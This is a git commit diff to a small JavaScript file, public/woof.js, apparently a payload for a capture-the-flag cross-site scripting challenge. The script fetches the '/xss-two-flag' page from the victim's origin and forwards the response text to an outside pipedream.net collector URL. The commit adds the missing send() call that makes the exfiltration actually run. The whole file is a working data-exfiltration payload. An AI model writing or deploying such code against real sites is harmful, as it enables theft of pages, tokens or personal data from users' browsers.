b9f2b2e1d73594f9cb76e47047926839f976bd86
Zhongbob <89343697+Zhongbob@users.noreply.github.com>
2024-05-04 23:03:52 +0800

    oops2

--- public/woof.js
+++ public/woof.js
@@ -1,16 +1,14 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = function() {
-    // Check if the request was successful
     if (xhr.status >= 200 && xhr.status < 300) {
-        // Parse the response if needed or directly use it
-        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText)
+        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText);
     } else {
-        // Handle errors, for example, display a message or log it
         console.log('The request failed with status:', xhr.status);
     }
 };
 
-console.log("works")
+console.log("works");
 xhr.open('GET','/xss-two-flag',true);
+xhr.send();
 
 
